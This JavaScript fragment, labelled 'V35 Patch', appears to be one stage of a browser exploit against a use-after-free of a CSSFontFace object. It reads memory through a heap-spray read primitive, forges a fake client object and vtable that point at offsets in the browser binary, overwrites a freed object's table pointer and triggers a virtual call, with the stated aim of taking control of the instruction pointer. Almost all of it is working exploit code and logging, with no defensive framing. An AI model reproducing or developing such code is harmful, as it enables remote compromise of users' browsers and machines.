// V35 Patch: THE AMENDED LADDER (council-approved)
//
// ARMS: born | weak | d0a | d0c | d1   (d0/d0b dropped: d0b explained by the
//        secondary-subobject model; d0 = open historical anomaly, not needed
//        for the RIP line per the council)
//
// d0c (amended, THE FIRST RUN): real-client control + static layout probe.
//   - EARLY (with identity reads, BEFORE any craft): read the COMPLETE HEAD
//     [FB-0x20, FB+0x28) = 0x48 bytes. Per the council: FB is the SECONDARY
//     CSSFontFace::Client subobject; the complete object B = FB-0x20 with:
//       B+0x00 primary vptr, B+0x08 context ptr, B+0x10 pending-activity,
//       B+0x18 REFCOUNT (behind the copy window!), B+0x20 = FB+0x00 Client
//       secondary vptr, B+0x28 = FB+0x08 L2, B+0x30 = FB+0x10 m_backing,
//       B+0x38 = FB+0x18 promise, B+0x40 = FB+0x20 the bool.
//   - GATE: FB+0x20 byte == 0 pre-load (else abort - no load).
//   - d0a config (impl.m_ptr=FB), craft LAST, NO readAt between craft+load.
//   - After RETURN: re-read the head, diff.
//   - EXPECT: RETURN, status 0->1->4, opcount=1 (last-round client count),
//     metadata {0,1,3,4} unchanged, implrc=3 unchanged, promise unchanged,
//     FB+0x20 byte 0->1 (the loadForBindings bool flip), NO net refcount
//     change (ref/deref balance).
//   - The EARLY head read identifies: live primary vptr, context ptr,
//     pending-activity, REFCOUNT CANDIDATE at B+0x18 = FB-0x08.
//
// d1 (THE SECOND RUN): exact d1 - fake client at S+0x50 (vptr -> S+0x90),
//   ALL slots NOPG EXCEPT slot 3 (+0x18) = the same-session real FSG
//   (BASE+0x5B3D6B0). EXTENDED PRE-LOAD GATING (direct views only): client
//   vptr, ALL 8 vtable slots readback vs expected, impl.m_ptr, metadata,
//   buckets, sources, counters, timer, face+0x58 install.
//   - EXPECT (per the council's model): RETURN. The virtual ref()/deref()
//     (slots 6/7 = NOPG) never touch RefCounted state -> no delete of the
//     forged "complete object" at S+0x30. slot 3 = real fontStateChanged
//     reads m_backing (copy+0x10 = the REAL reclaimed face address) and
//     m_loadedPromise (copy+0x18 = the REAL promise); Loading: break;
//     Failure: isFulfilled(real)=true -> skip -> return.
//   - THIS IS THE DECISION-RELEVANT BASELINE: if d1 returns reproducibly,
//     the one-slot differential (slot 3 -> poison) is the RIP line, and
//     the historical d0 anomaly does not need to be solved.
//
// THE POISON LAW (proven): every readAt writes garbage into the reclaimed
// face (the read carrier) at +0x30..0x67, INCLUDING the installed table
// pointer at +0x58. ORDER: all early reads -> craft LAST (+0x58 last write)
// -> NO readAt -> load -> post-load reads/diff.
//
// THE d0b LESSON (council model, not to be re-tested as forward copy):
//   FB = Client subobject at B+0x20; ref()/deref() are -0x20 adjustor
//   thunks; a forward-only copy puts the "complete object" at bucket[3]=0
//   -> ref 0->1, deref 1->0 -> delete -> crash. Do not forward-copy.

/* ==== V35: THE AMENDED LADDER ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V35-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      var ARM=(function(){var m=/[?&]arm=(born|weak|d0a|d0c|d1)/.exec(location.search);return m?m[1]:'d0c';})();
      bs('V35-ARM='+ARM);

      /* ---- STEP 1: ALL readAt FIRST (identity reads) ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V35-PROMISE-ADDR='+hex(promiseAddr));
      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V35-PROMISE-BEFORE='+promiseBefore);

      /* d0c/d1/d0a: THE COMPLETE HEAD READ (EARLY, pre-craft).
       * [FB-0x20, FB+0x28) = 0x48 bytes: B(primary) .. C+0x28.
       * Identifies: primary vptr, context, pending-activity, REFCOUNT
       * CANDIDATE at B+0x18 (= FB-0x08), and the full Client subobject. */
      var headBefore=readAt(FB-0x20n,0x48);
      bs('V35-HEAD-BEFORE='+headBefore);

      bs('V35-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V35-NO-SIBLING');verd('err','V35 no sibling');throw 'no sibling';}
      bs('V35-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V35-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the FORGE (metadata via setUint32) ---- */
      bs('V35-FORGE-BUILD');

      /* impl = real L2 byte-copy; m_ptr per arm */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      if(ARM==='weak')      dvSetBig(sv,0x08,0n);   /* null client -> entry removed */
      else if(ARM==='d0a'||ARM==='d0c')dvSetBig(sv,0x08,FB); /* the REAL wrapper */
      else if(ARM==='d1')  dvSetBig(sv,0x08,S+0x50n); /* our fake client */
      else                 dvSetBig(sv,0x08,0n);   /* born: unreferenced */
      bs('V35-IMPL-rc='+sv.getUint32(0x00,true)+'-m_ptr='+hex(dvGetBig(sv,0x08)));

      sv.setUint32(0x20, 0, true);
      sv.setUint32(0x24, (ARM==='born')?0:1, true);
      sv.setUint32(0x28, 3, true);
      sv.setUint32(0x2C, 4, true);

      if(ARM==='born'){
        dvSetBig(sv,0x30,0n); dvSetBig(sv,0x38,0n);
        dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
      }else{
        dvSetBig(sv,0x30,S); dvSetBig(sv,0x38,0n);
        dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);
      }

      /* client copy (used by d1; harmless otherwise) */
      for(var cb=0;cb<0x40;cb++)sv.setUint8(0x50+cb,parseInt(fbRaw.substr(cb*2,2),16));
      if(ARM==='d1')dvSetBig(sv,0x50+0x00,S+0x90n); /* fake vtable for d1 ONLY */
      var clientPromise=dvGetBig(sv,0x50+0x18);
      bs('V35-CLIENT-PROMISE='+hex(clientPromise)+(clientPromise===promiseAddr?'-IS-REAL-OK':'-MISMATCH'));

      /* vtable: all NOPG; slot3 = real FSG for d1 (d1 only) */
      for(var vs=0;vs<8;vs++)dvSetBig(sv,0x90+vs*8,NOPG);
      if(ARM==='d1')dvSetBig(sv,0x90+0x18,FSG);
      bs('V35-FORGE-BUILT-T='+(S+0x30n).toString(16)+'-slot3='+hex(dvGetBig(sv,0x90+0x18)));

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE (LAST before load; NO readAt after) ---- */
      bs('V35-FACE-CRAFT');
      for(var sz=0x28;sz<=0x57;sz++)hitBuf[sz]=0;   /* incl. sources vector +0x48..0x57 */
      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;   /* counters (poisoned by carrier) */
      hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;

      /* ---- STEP 4: install (LAST write) ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);

      /* ---- STEP 5: GATES (direct views ONLY) ---- */
      var gatesOK=true;
      function hx(u8){var s='';for(var i=0;i<u8.length;i++)s+=('0'+u8[i].toString(16)).slice(-2);return s;}

      /* G1 metadata */
      var g1hex='';for(var g1=0;g1<16;g1++)g1hex+=('0'+sv.getUint8(0x20+g1).toString(16)).slice(-2);
      var expectHex=(ARM==='born')?'00000000000000000300000004000000':'00000000010000000300000004000000';
      bs('V35-G1-meta='+g1hex);
      if(g1hex!==expectHex){gatesOK=false;bs('V35-G1-FAIL');}

      /* G2 install */
      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
      if(g2!==(S+0x30n)){gatesOK=false;bs('V35-G2-FAIL-face58='+hex(g2));}
      else bs('V35-G2-face58-OK');

      /* G3 counters zero */
      var g3d=true;for(var g3=0x60;g3<0x68;g3++)if(hitBuf[g3]!==0)g3d=false;
      if(!g3d){gatesOK=false;bs('V35-G3-FAIL-counters');}else bs('V35-G3-counters-zero-OK');

      /* G4 sources zero */
      var g4d=true;for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4d=false;
      if(!g4d){gatesOK=false;bs('V35-G4-FAIL-sources='+hx(hitBuf.slice(0x48,0x58)));}else bs('V35-G4-sources-zero-OK');

      /* G5 status/override/timer */
      var g5v=0n;for(var q9=0;q9<8;q9++)g5v|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
      var g5t=0n;for(var q10=0;q10<8;q10++)g5t|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
      var g5h=0n;for(var q11=0;q11<8;q11++)g5h|=BigInt(hitBuf[0xA8+q11])<<BigInt(q11*8);
      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5v!==0n&&g5t!==0n&&g5h===0n)){gatesOK=false;bs('V35-G5-FAIL');}
      else bs('V35-G5-status-ovr-timer-OK');

      /* G6 [d1] client vptr + ALL 8 vtable slots readback */
      if(ARM==='d1'){
        var cptr=dvGetBig(sv,0x50+0x00);
        if(cptr!==(S+0x90n)){gatesOK=false;bs('V35-G6-FAIL-client-vptr='+hex(cptr));}
        else bs('V35-G6-client-vptr-OK');
        var slotExp=[NOPG,NOPG,NOPG,FSG,NOPG,NOPG,NOPG,NOPG];
        var slotsBad=[];
        for(var s6=0;s6<8;s6++){
          var got=dvGetBig(sv,0x90+s6*8);
          if(got!==slotExp[s6])slotsBad.push('slot'+s6+'='+hex(got));
        }
        if(slotsBad.length){gatesOK=false;bs('V35-G6-FAIL-slots-'+slotsBad.join('|'));}
        else bs('V35-G6-all-8-slots-OK-slot3='+hex(dvGetBig(sv,0x90+0x18)));
        var imp=dvGetBig(sv,0x08);
        if(imp!==(S+0x50n)){gatesOK=false;bs('V35-G6-FAIL-impl-mptr='+hex(imp));}
        else bs('V35-G6-impl-mptr-OK');
      }

      /* G7 [d0c/d0a/weak] impl.m_ptr == FB (real client) */
      if(ARM==='d0a'||ARM==='d0c'||ARM==='weak'){
        if(dvGetBig(sv,0x08)!==FB&&ARM!=='weak'){gatesOK=false;bs('V35-G7-FAIL');}
        else bs('V35-G7-impl-mptr-OK');
      }

      /* G8 [d0c] the bool pre-state: FB+0x20 byte == 0 (from headBefore) */
      if(ARM==='d0c'){
        var boolByte=parseInt(headBefore.substr((0x20+0x20)*2,2),16); /* head[0x40] = FB+0x20 */
        if(boolByte!==0){gatesOK=false;bs('V35-G8-FAIL-bool-byte='+boolByte);}
        else bs('V35-G8-bool-prestate-zero-OK');
      }

      if(!gatesOK){
        bs('V35-GATE-FAIL-ABORT-NO-LOAD');
        verd('err','V35 gate fail - load() NOT called');
      }else{
        bs('V35-GATES-ALL-OK');

        /* ---- STEP 6: THE DISPATCH ---- */
        bs('V35-LOAD-PRE');
        var loadReturned=false;
        try{
          faces[zi].load();
          loadReturned=true;
          bs('V35-LOAD-RETURNED');
        }catch(e){
          bs('V35-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }

        /* ---- STEP 7: COMPOSITE WITNESS ---- */
        var opcnt=hitBuf[0x60]|(hitBuf[0x61]<<8)|(hitBuf[0x62]<<16)|(hitBuf[0x63]<<24);
        var postMeta='';for(var pm=0;pm<16;pm++)postMeta+=('0'+sv.getUint8(0x20+pm).toString(16)).slice(-2);
        bs('V35-WIT-status='+hitBuf[0x82]+'-opcount='+opcnt+'-meta='+postMeta+'-bk0='+hex(dvGetBig(sv,0x30))+'-implrc='+sv.getUint32(0x00,true));
        try{bs('V35-JS-STATUS='+faces[zi].status);}catch(e){bs('V35-JS-STATUS-ERR');}

        /* ---- STEP 8: [d0c] THE HEAD DIFF (post-load reads safe now) ---- */
        if(ARM==='d0c'){
          var headAfter=readAt(FB-0x20n,0x48);
          bs('V35-HEAD-AFTER='+headAfter);
          if(headAfter!==headBefore){
            var hd=[];
            for(var hf=0;hf<0x48;hf+=4){
              var hb4=parseInt(headBefore.substr(hf*2,8),16),ha4=parseInt(headAfter.substr(hf*2,8),16);
              if(ha4!==hb4)hd.push('@0x'+(hf-0x20).toString(16)+'(B+'+hf.toString(16)+'):'+hb4.toString(16)+'>'+ha4.toString(16));
            }
            bs('WIT-V35-HEAD-DIFF-'+hd.join('|'));
          }else bs('WIT-V35-HEAD-unchanged');
        }

        /* promise witness + forge diff (post-load reads safe) */
        var promiseAfter=readAt(promiseAddr,0x30);
        if(promiseAfter!==promiseBefore)bs('WIT-V35-PROMISE-CHANGED');
        else bs('WIT-V35-PROMISE-UNCHANGED');
        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
        var diffs=[];
        for(var wq=0;wq<0x100;wq+=8){
          var cur=0n,old=0n;
          for(var wb=0;wb<8;wb++){
            cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
            old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
          }
          if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
        }
        if(diffs.length)bs('WIT-V35-FORGE-WRITE-'+diffs.slice(0,10).join('|'));
        else bs('WIT-V35-FORGE-nowrite');

        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V35-RESTORED');

        if(loadReturned){
          verd('ok','V35 '+ARM+' RETURNED');
          bs('V35-DONE-'+ARM+'-RETURNED');
        }else{
          verd('err','V35 '+ARM+' crashed');
          bs('V35-DONE-'+ARM+'-CRASHED');
        }
      }

    }else bs('V35-SKIP-bad-idx');
  }else bs('V35-SKIP-missing-data');
}catch(e35){bs('V35-ERR-'+String(e35&&e35.message?e35.message:'?'));}
/* ==== V35 END ==== */